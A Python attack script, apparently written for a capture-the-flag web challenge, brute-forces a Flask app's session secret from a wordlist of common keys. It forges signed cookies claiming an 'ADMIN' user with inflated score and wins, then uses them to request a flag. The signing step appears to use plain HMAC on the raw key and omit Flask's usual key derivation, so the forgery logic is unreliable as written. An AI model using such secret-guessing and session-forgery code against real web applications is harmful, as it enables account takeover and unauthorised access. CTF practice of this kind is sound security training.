import requests, hashlib, hmac, base64, json, sys, time
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
sys.stderr.reconfigure(encoding='utf-8', errors='replace')

base = 'https://web-random-cheese.tracebash.xyz'

# Try common Flask secret keys
secrets_to_try = [
    'secret', 'supersecretkey', 'flask-secret', 'changeme', 'password', 
    'admin', 'cheese', 'jerry', 'tom', 'lucky', 'draw', 'lucky-draw',
    'tomandjerry', 'tom_and_jerry', 'tom&jerry', 'CTF', 'ctf',
    'session_secret', 'SECRET_KEY', 'development', 'debug',
    'FLASK_SECRET', 'super_secret_key', 'you-will-never-guess',
    'my-secret-key', 'test', 'key', '1234567890', 'abc123',
    'A1b2C3d4E5f6', 'qwerty', 'letmein', 'monkey', 'dragon',
    'Tracer', 'REDBOX', 'cheese', 'swiss', 'cheddar', 'gouda'
]

# Get a current timestamp-based signature
# Session: eyJ1c2VybmFtZSI6InRlc3R3aW4ifQ.XYZ.signature 
# where XYZ is base64 timestamp

# Test with fresh account
s = requests.Session()
s.post(f'{base}/register', data={'username':'testsecrets','password':'testsecrets'})
s.post(f'{base}/login', data={'username':'testsecrets','password':'testsecrets'})
cookie = s.cookies.get('session')
print(f'Current cookie: {cookie}')

parts = cookie.split('.')
payload_b64 = parts[0]
timestamp_b64 = parts[1]
sig = parts[2]

# Try to sign with known secrets
import time as time_module
current_ts = int(time_module.time())

for secret in secrets_to_try:
    # Create payload with score
    payload = {'username': 'ADMIN', 'score': 85, 'wins': 1000000}
    payload_enc = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
    
    # Sign
    ts_hex = format(current_ts, 'x')
    ts_b64 = base64.urlsafe_b64encode(bytes.fromhex('0' + ts_hex if len(ts_hex) % 2 else ts_hex)).rstrip(b'=').decode()
    
    msg = f'{payload_enc}.{ts_b64}'.encode()
    sig_check = hmac.new(secret.encode(), msg, hashlib.sha1).hexdigest()[:40]
    sig_b64 = base64.urlsafe_b64encode(bytes.fromhex(sig_check)).rstrip(b'=').decode()
    
    forged_cookie = f'{payload_enc}.{ts_b64}.{sig_b64}'
    
    # Test this cookie
    r = requests.get(f'{base}/', cookies={'session': forged_cookie})
    if 'login' not in r.url.lower() and r.status_code == 200 and 'Invalid' not in r.text[:200]:
        if 'login' not in r.text.lower()[:500] or 'welcome' in r.text.lower()[:500]:
            print(f'\n*** POSSIBLE SECRET: {secret!r} ***')
            print(f'Cookie: {forged_cookie}')
            print(f'URL: {r.url}')
            # Try claim
            r2 = requests.post(f'{base}/claim', cookies={'session': forged_cookie})
            print(f'Claim URL: {r2.url}')
            if 'flag' in r2.text.lower():
                print(f'FLAG RESPONSE: {r2.text[:2000]}')
            break

print('Secret search done')
